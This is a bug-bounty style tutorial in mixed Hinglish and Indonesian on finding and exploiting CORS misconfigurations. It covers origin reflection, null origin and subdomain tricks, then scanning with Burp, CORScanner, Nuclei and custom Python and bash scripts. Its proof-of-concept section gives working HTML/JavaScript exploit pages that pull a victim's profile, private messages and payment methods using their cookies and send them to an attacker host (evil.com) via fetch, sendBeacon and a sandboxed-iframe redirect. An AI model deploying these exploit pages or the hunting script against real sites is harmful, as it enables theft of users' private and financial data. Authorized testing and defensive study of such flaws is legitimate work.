# CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! 

## CORS Misconfiguration Types

### Type 1: Wildcard Origin Sabse Basic

**Request:**

```bash
GET /api/userdata HTTP/1.1
Origin: https://evil.com
```

**Response:**

```bash
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true ← PROBLEM!
```

Wildcard `(*)` + kredensial = berbahaya

Kombinasi ini pada CORS bisa jadi risiko serius.

Secara standar browser, kredensial (cookies/authorization headers) **tidak boleh digunakan bersama `Access-Control-Allow-Origin: *`**.

Namun pada beberapa implementasi yang salah, kondisi ini bisa menyebabkan bypass dan membuka celah keamanan.

### Type 2: Origin Reflection Sabse Common Bug!

**Request:**

```bash
GET /api/profile HTTP/1.1
Origin: https://evil.com
```

**Response:**

```bash
Access-Control-Allow-Origin: https://evil.com ← REFLECTED!
Access-Control-Allow-Credentials: true
```

Server secara *blindly* merefleksikan header `Origin` tanpa validasi.

Mohon validasi ulang.
→ Berpotensi memungkinkan pengambilan data dari origin mana saja 🔴

### Type 3: Null Origin Bypass

**Request:**

```bash
GET /api/data HTTP/1.1
Origin: null
```

**Response:**

```bash
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Kasus ini biasanya muncul di sandbox iframe / file:// origin.
Jika tidak divalidasi ketat, bisa dipakai untuk bypass akses data sensitif.

### Type 4: Subdomain Wildcard Misconfiguration

**Request:**

```bash
GET /api/info HTTP/1.1
Origin: https://evil.sub.target.com
```

**Response:**

```bash
Access-Control-Allow-Origin: https://evil.sub.target.com
Access-Control-Allow-Credentials: true
```

Atau lebih parah:

```bash
*.target.com di-allow tanpa validasi ketat subdomain
```

Risiko: subdomain takeover + data leakage antar subdomain.

### Type 5: HTTP → HTTPS Trust

**Request:**

```bash
GET /api/user HTTP/1.1
Origin: http://evil.com
```

**Response:**

```bash
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true
```

Jika sistem menerima HTTP origin, attacker bisa downgrade trust dan intercept / exfiltrate data.

### Type 6: Special Characters Bypass

**Request:**

```bash
GET /api/test HTTP/1.1
Origin: https://evil.com%0d%0a
```

**Response:**

```bash
Access-Control-Allow-Origin: https://evil.com
```

Parsing Origin tidak bersih → CRLF / encoding bypass bisa menyebabkan origin validation dilewati.


## Manual Testing Step by Step

### Step 1: Burp Suite Se Origin Header Add Karo

```bash
# Normal request:
GET /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
```

```bash
# Modified request — Origin add karo:
GET /api/user/profile HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Origin: https://evil.com
```

```bash
# Response check karo:
Access-Control-Allow-Origin: https://evil.com  ← Reflected!
Access-Control-Allow-Credentials: true          ← Credentials!
```

→ CORS Misconfiguration! 🎯

### Step 2: Different Origins Test Karo

```bash
# Test origins list:
https://evil.com
https://evilttarget.com
https://target.com.evil.com
https://evil-target.com
null
http://target.com
https://subdomain.target.com
https://notarget.com
```

### Step 3: Credentials Check Karo

```bash
# Sirf ACAO header enough nahi hai!
# ACAC header bhi chahiye exploit ke liye:
```

```bash
Exploitable:
Access-Control-Allow-Origin: https://evil.com ✅
Access-Control-Allow-Credentials: true ✅
```

```bash
Not Exploitable (cookies nahi milenge):
Access-Control-Allow-Origin: * ✅
Access-Control-Allow-Credentials: (missing/false) ❌
```

### Step 4: Pre-flight Request Test

```bash
# Complex requests ke liye browser OPTIONS bhejta hai:
OPTIONS /api/data HTTP/1.1
Host: target.com
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

```bash
# Response check karo:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET,POST,PUT,DELETE
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Credentials: true
```

→ Pre-flight bhi bypass! 🔴

## Real Exploit Data Steal PoC

### Basic CORS Exploit:

```html
<!-- evil.com/exploit.html -->
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Target ki API se data steal karo
fetch('https://target.com/api/user/profile', {
  credentials: 'include'  // Victim ke cookies bhejta hai!
})
.then(response => response.json())
.then(data => {
  // Data attacker ke server pe bhejo
  fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(data)));
  document.body.innerHTML = "Page loaded!";
})
.catch(err => console.log(err));
</script>
</body>
</html>
```

## Advanced Exploit Full Account Data Steal:

```html
<!-- evil.com/advanced_exploit.html -->
<!DOCTYPE html>
<html>
<body>
<script>
async function stealData() {
  try {
    // Step 1: Profile data
    const profile = await fetch(
      'https://target.com/api/user/profile',
      {credentials: 'include'}
    ).then(r => r.json());

    // Step 2: Private messages
    const messages = await fetch(
      'https://target.com/api/messages',
      {credentials: 'include'}
    ).then(r => r.json());

    // Step 3: Payment info
    const payments = await fetch(
      'https://target.com/api/payment-methods',
      {credentials: 'include'}
    ).then(r => r.json());

    // Step 4: Sab data ek saath exfiltrate karo
    const allData = {
      profile: profile,
      messages: messages,
      payments: payments,
      timestamp: new Date().toISOString()
    };

    // Attacker ke server pe bhejo
    navigator.sendBeacon(
      'https://evil.com/collect',
      JSON.stringify(allData)
    );

  } catch(e) {
    // Silent fail
  }
}

stealData();
</script>
</body>
</html>
```


### Null Origin Exploit:

```html
<!-- Sandbox iframe trick -->
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src='data:text/html,
    <script>
      var req = new XMLHttpRequest();
      req.onload = function() {
        location = "https://evil.com/steal?data=" + btoa(this.responseText);
      };
      req.open("get", "https://target.com/api/sensitive", true);
      req.withCredentials = true;
      req.send();
    </script>'>
</iframe>
```

## Automated Testing Tools

### Tool 1: CORScanner

```bash
# Install karo
pip3 install corscanner
```

```bash
# Single target
corscanner -u https://target.com
```

```bash
# File se multiple targets
corscanner -i targets.txt
```

```bash
# Verbose output
corscanner -u https://target.com -v
```

Tool 2: Nuclei CORS Templates

### Nuclei se automated check

```bash
nuclei -l targets.txt \
  -t ~/nuclei-templates/misconfiguration/cors/ \
  -o cors_found.txt
```

```bash
# Tags se
nuclei -l targets.txt \
  -tags cors \
  -o cors_results.txt
```

### Tool 3: Burp Suite Passive Scan

```
1. Burp Suite Pro → Scanner
2. "Issues" mein CORS issues automatically flag hota hai
3. Manual verification karo
```

### Tool 4: Custom Python Script

```python
#!/usr/bin/env python3
# cors_check.py

import requests
import sys

def check_cors(url, origins):
    print(f"\n🔍 Testing: {url}")
    print("─" * 50)

    for origin in origins:
        try:
            headers = {
                "Origin": origin,
                "Cookie": "session=YOUR_SESSION_HERE"
            }
            r = requests.get(url, headers=headers,
                           timeout=10, verify=False)

            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao and (acao == origin or acao == "*"):
                if acac.lower() == "true":
                    print(f"🔴 VULNERABLE! Origin: {origin}")
                    print(f"   ACAO: {acao}")
                    print(f"   ACAC: {acac}")
                else:
                    print(f"🟡 Partial: {origin} (no credentials)")
            else:
                print(f"✅ Safe: {origin}")
        except Exception as e:
            print(f"❌ Error: {e}")

# Test origins
ORIGINS = [
    "https://evil.com",
    "null",
    "https://TARGET.com.evil.com",
    "https://evil-TARGET.com",
    "http://TARGET.com",
]

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 \
             else "https://target.com/api/user"

check_cors(TARGET_URL, ORIGINS)
```


## Elite CORS Hunting Workflow

```bash
#!/bin/bash
# cors_hunt.sh

TARGET=$1
DIR="cors_${TARGET}"
mkdir -p $DIR

echo "🔀 CORS Hunt: $TARGET"
echo "═══════════════════════"

# Step 1: API endpoints dhundho
echo "📡 Finding API endpoints..."
gau $TARGET | grep -iE "/api/|/v1/|/v2/" | \
  grep -v "\.js\|\.css\|\.png" | \
  uro > $DIR/api_endpoints.txt
echo "✅ APIs: $(wc -l < $DIR/api_endpoints.txt)"

# Step 2: Live endpoints
cat $DIR/api_endpoints.txt | \
  httpx -silent -mc 200 > $DIR/live_apis.txt
echo "✅ Live: $(wc -l < $DIR/live_apis.txt)"

# Step 3: CORS check karo
echo "🔍 Checking CORS..."
while read url; do
  response=$(curl -s -I \
    -H "Origin: https://evil.com" \
    -H "Cookie: test=test" \
    "$url" 2>/dev/null)

  acao=$(echo "$response" | \
    grep -i "access-control-allow-origin" | \
    head -1)
  acac=$(echo "$response" | \
    grep -i "access-control-allow-credentials" | \
    head -1)

  if echo "$acao" | grep -qi "evil.com"; then
    if echo "$acac" | grep -qi "true"; then
      echo "🔴 CRITICAL CORS: $url" \
        >> $DIR/cors_vulnerable.txt
      echo "   $acao" >> $DIR/cors_vulnerable.txt
      echo "   $acac" >> $DIR/cors_vulnerable.txt
    else
      echo "🟡 CORS (no creds): $url" \
        >> $DIR/cors_partial.txt
    fi
  fi
done < $DIR/live_apis.txt

# Step 4: Nuclei scan
nuclei -l $DIR/live_apis.txt \
  -tags cors \
  -silent \
  -o $DIR/nuclei_cors.txt 2>/dev/null

echo "═══════════════════════"
echo "📊 CORS Hunt Results:"
echo "API Endpoints  : $(wc -l < $DIR/api_endpoints.txt)"
echo "Live APIs      : $(wc -l < $DIR/live_apis.txt)"
echo "CORS Vulnerable: $(cat $DIR/cors_vulnerable.txt \
  2>/dev/null | grep "CRITICAL" | wc -l)"
echo "Results in     : $DIR/"
```
